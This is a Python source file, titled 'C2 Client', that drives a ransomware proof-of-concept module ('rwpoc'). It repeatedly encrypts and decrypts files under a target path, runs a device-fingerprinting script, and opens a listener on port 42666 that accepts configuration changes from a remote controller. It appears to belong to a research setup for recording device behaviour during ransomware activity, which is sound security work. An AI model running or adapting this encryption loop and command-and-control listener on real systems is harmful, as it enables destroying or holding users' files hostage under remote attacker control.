from argparse import ArgumentParser
from json import loads
from multiprocessing import Process
from socket import AF_INET, SOCK_STREAM, socket
from subprocess import call

from globals import update_existing_config
from rwpoc import run

TARGET_PATH = "<start-path-on-target-device>"


def parse_args():
    parser = ArgumentParser(description='C2 Client')
    parser.add_argument('-n', '--number',
                        help='Number of fingerprints to collect in one encryption run.',
                        default=0,
                        action="store")

    return parser.parse_args()


def listen_for_config_changes():
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 42666))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()  # keep listening for new connections
            with conn:
                while True:
                    data = conn.recv(1024)  # listen for incoming data of connection
                    if not data:
                        break
                    new_config = loads(data.decode(encoding="utf-8"))
                    print("received", new_config)
                    update_existing_config(new_config)


def collect_device_fingerprint(limit):
    if limit > 0:
        """
        Remember: once the limit is reached the subprocess is terminated.
        However, the (parent) encryption process is still running to completion
        and will re-trigger the FP collection on the next iteration - up to the limit.
        """
        call(["./fingerprinter.sh", "-n {}".format(limit)])
    else:
        call("./fingerprinter.sh")  # without option "-n <limit>", this will continuously collect FP


def kill_process(proc):
    print("kill Process", proc)
    proc.terminate()
    proc.join()


if __name__ == "__main__":
    # Parse arguments
    args = parse_args()
    num_fp = int(args.number)

    # Start subprocess to integrate config changes
    procs = []
    proc_config = Process(target=listen_for_config_changes)
    procs.append(proc_config)
    proc_config.start()

    try:
        abs_paths = TARGET_PATH

        while True:
            # input("\nEnter: start encrypting")

            proc_fp = Process(target=collect_device_fingerprint, args=(num_fp,))
            proc_fp.start()
            procs.append(proc_fp)

            # input("\nwait shortly for child to start")
            print("\nENCRYPT")

            run(encrypt=True, absolute_paths=abs_paths)  # encrypt
            kill_process(proc_fp)
            procs.remove(proc_fp)

            # input("\nEnter: start decrypting")
            print("\nDECRYPT")

            run(encrypt=False, absolute_paths=abs_paths)  # decrypt
    finally:
        print("finally")
        for proc in procs:
            if proc.is_alive():
                kill_process(proc)
            else:
                print("Process", proc, "already dead.")
